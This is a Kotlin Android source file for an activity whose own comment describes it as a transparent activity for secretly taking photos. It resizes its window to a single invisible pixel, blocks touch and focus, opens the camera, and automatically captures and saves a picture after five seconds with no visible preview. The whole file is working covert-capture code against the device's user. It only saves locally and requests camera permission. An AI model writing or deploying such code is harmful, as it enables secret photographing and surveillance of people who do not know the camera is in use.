package com.darcy.message.lib_camera.camera1.activity

import android.content.Context
import android.hardware.Camera
import android.hardware.Camera.PictureCallback
import android.os.Bundle
import android.view.SurfaceHolder
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.darcy.message.lib_camera.CameraPrams
import com.darcy.message.lib_camera.databinding.LibCameraActivityInvisibleCameraBinding
import com.darcy.message.lib_common.exts.logD
import com.darcy.message.lib_common.exts.logI
import com.darcy.message.lib_permission.permission.PermissionUtil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.io.IOException


/**
 * 透明Activity实现偷偷拍照
 */
class InVisibleCameraActivity : AppCompatActivity() {
    private val binding: LibCameraActivityInvisibleCameraBinding by lazy {
        LibCameraActivityInvisibleCameraBinding.inflate(layoutInflater)
    }
    private val context: Context by lazy {
        this
    }

    private val outputMediaFile: File?
        get() {
            val mediaStorageDir = File(getExternalFilesDir(null), "MyCameraAppInvisible")
            if (!mediaStorageDir.exists()) {
                if (!mediaStorageDir.mkdirs()) {
                    return null
                }
            }
            val timeStamp = System.currentTimeMillis().toString()
            return File(mediaStorageDir.path + File.separator + "IMG_" + timeStamp + ".jpg")
        }

    private val pictureCallback: PictureCallback = object : PictureCallback {
        override fun onPictureTaken(data: ByteArray, camera: Camera) {
            logI("pictureCallback save start")
            val pictureFile: File = outputMediaFile ?: return
            try {
                val fos = FileOutputStream(pictureFile)
                fos.write(data)
                fos.close()
                logI("pictureCallback save end")
                finish() // 拍照成功，结束Activity
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }


    private var mCamera: Camera? = null

    private var mCameraRange: Int = 90

    private lateinit var mSurfaceHolder: SurfaceHolder

    private var screenWidth: Int = 0

    private var screenHeight: Int = 0

    private var previewWidth: Int = 0

    private var previewHeight: Int = 0

    private var screenGY: Int = 0

    private val mainScope: CoroutineScope by lazy {
        MainScope()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
//        setContentView(R.layout.lib_camera_activity_camera)
        setContentView(binding.root)
        ViewCompat.setOnApplyWindowInsetsListener(binding.main) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        // 设置 Activity 的大小为 1 像素
        val params = window.attributes
        params.width = 1
        params.height = 1
        params.flags =
            params.flags or (WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE)
        window.attributes = params

        // 获取屏幕尺寸以获取最佳的相机预览尺寸
        getScreenSize()
        // 设置相机监听
        initListener()
        // 延时拍照
        autoTakePictureAfterDelay()
    }

    private fun autoTakePictureAfterDelay() {
        mainScope.launch {
            logI("autoTakePictureAfterDelay start")
            repeat(5) {
                delay(1_000)
                logD("delay $it")

            }
            mCamera?.takePicture(null, null, pictureCallback)
            logI("autoTakePictureAfterDelay end")
        }
    }

    private fun checkCameraPermission() {
        if (PermissionUtil.checkPermissions(context, listOf(android.Manifest.permission.CAMERA))) {
            openCamera()
        } else {
            PermissionUtil.requestPermissions(this, listOf(android.Manifest.permission.CAMERA),
                onGranted = {
                    openCamera()
                },
                onDenied = {
                    // 处理拒绝授权的情况
                })
        }
    }

    private fun initListener() {
        mSurfaceHolder = binding.surfaceView.holder
        mSurfaceHolder.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) {
                checkCameraPermission()
            }

            override fun surfaceChanged(
                holder: SurfaceHolder,
                format: Int,
                width: Int,
                height: Int
            ) {
                mCamera?.let {
                    val parameters = it.parameters
                    getPreviewSize(parameters)
                    parameters.setPictureSize(previewWidth, previewHeight)
                    // 设置自动对焦模式
                    parameters.focusMode = Camera.Parameters.FOCUS_MODE_AUTO
                    parameters.focusMode = Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE
                    it.parameters = parameters
                    try {
                        it.setPreviewDisplay(holder)
                        it.startPreview()
                    } catch (e: Exception) {
                        e.printStackTrace()
                        Toast.makeText(context, e.message, Toast.LENGTH_SHORT).show()
                    }
                }
            }

            override fun surfaceDestroyed(holder: SurfaceHolder) {
                if (null != mCamera) {
                    holder.removeCallback(this)
                    releaseCamera()
                }
            }

        })
        mSurfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS)

    }

    /**
     * 打开相机
     */
    private fun openCamera() {
        if (null == mCamera) {
            // 假如摄像头开启成功则返回一个Camera对象
            mCamera = Camera.open(0)
            //预览画面默认是横屏的，需要旋转90度
            mCamera?.setDisplayOrientation(mCameraRange)
        }
    }

    /**
     * 释放相机
     */
    private fun releaseCamera() {
        mCamera?.setPreviewCallback(null)
        //停止预览
        mCamera?.stopPreview()
        mCamera?.lock()
        //释放相机资源
        mCamera?.release()
        mCamera = null
    }

    /**
     * 根据屏幕尺寸以及相机支持的分辨率获取最佳预览分辨率
     *
     * @param parameters 相机参数
     */
    private fun getPreviewSize(parameters: Camera.Parameters) {
        // 选择合适的图片尺寸，必须是手机支持的尺寸
        val sizeList = parameters.supportedPictureSizes
        // 如果sizeList只有一个我们也没有必要做什么了，因为就他一个别无选择
        if (sizeList.size > 1) {
            for (size: Camera.Size in sizeList) {
                logI("分辨率>>>Width=" + size.height + "__Height=" + size.width)
                val sizeGY = getGY(size.height, size.width)
                if (screenWidth / screenGY == size.height / sizeGY && screenHeight / screenGY == size.width / sizeGY) {
                    previewWidth = size.height
                    previewHeight = size.width
                    return
                }
            }
        }
        if (previewWidth <= 0 || previewHeight <= 0) {
            previewWidth = CameraPrams.previewWidth
            previewHeight = CameraPrams.previewHeight
        }
        logI("分辨率:previewWidth=" + previewWidth + "__previewHeight=" + previewHeight)
    }

    /**
     * 获取两个数的公约数
     *
     * @param a 数字1
     * @param b 数字2
     *
     * @return 公约数
     */
    private fun getGY(a: Int, b: Int): Int {
        var localA = a
        var localB = b
        while (localA % localB != 0) {
            val temp = localA % localB
            localA = localB
            localB = temp
        }
        return localB
    }

    /**
     * 获取屏幕大小
     */
    private fun getScreenSize() {
        val resource = this.resources
        val dm = resource.displayMetrics
        screenWidth = dm.widthPixels
        screenHeight = dm.heightPixels

        screenGY = getGY(screenWidth, screenHeight)
    }

    override fun onResume() {
        super.onResume()
        initializeCamera()
    }

    override fun onPause() {
        super.onPause()
        releaseCamera()
    }

    override fun onDestroy() {
        super.onDestroy()
        releaseCamera()
    }

    private fun initializeCamera() {
        try {
            openCamera()
            mCamera?.setPreviewDisplay(mSurfaceHolder)
            mCamera?.startPreview()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

}
